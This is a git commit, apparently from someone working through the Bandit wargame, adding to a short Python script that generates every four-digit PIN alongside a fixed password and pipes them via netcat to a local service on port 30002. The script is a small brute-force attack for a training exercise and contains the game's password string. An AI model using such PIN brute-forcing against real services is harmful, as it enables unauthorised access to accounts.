fea3e3e1af5d013294bcc7286906344e77896ab3
Dalton Cole <dalton_cl@yahoo.com>
2017-02-05 22:21:10 -0600

    Bandit 25, still working on it

--- bruteforce.py
+++ bruteforce.py
@@ -1,4 +1,8 @@
+import os
+
 with open('bandit24.txt', 'w') as f:
 	for i in range(0, 10000):
 		s = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + str(i).zfill(4) + '\n'
 		f.write(s)
+
+os.system("nc localhost 30002 < bandit24.txt | grep -v Wrong!")
